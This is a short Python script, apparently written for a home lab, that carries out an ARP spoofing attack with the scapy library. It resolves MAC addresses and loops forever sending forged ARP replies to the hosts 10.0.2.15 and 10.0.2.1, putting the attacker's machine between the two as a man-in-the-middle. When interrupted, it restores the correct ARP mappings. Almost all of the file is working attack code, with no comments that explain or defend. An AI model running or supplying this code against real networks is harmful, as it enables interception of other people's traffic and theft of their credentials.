import scapy.all as scapy
import time

def get_mac_address(ip):

    arp_request_packet = scapy.ARP(pdst =ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    answered_list.summary()

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP())


def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)
    #scapy.ls(scapy.ARP())






number = 0

try:
    while True:

        arp_poisoning("10.0.2.15","10.0.2.1")
        arp_poisoning("10.0.2.1","10.0.2.15")

        number += 2

        print("\rSending Packets" + str(number), end="")
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation("10.0.2.15","10.0.2.1")
    reset_operation("10.0.2.1","10.0.2.15")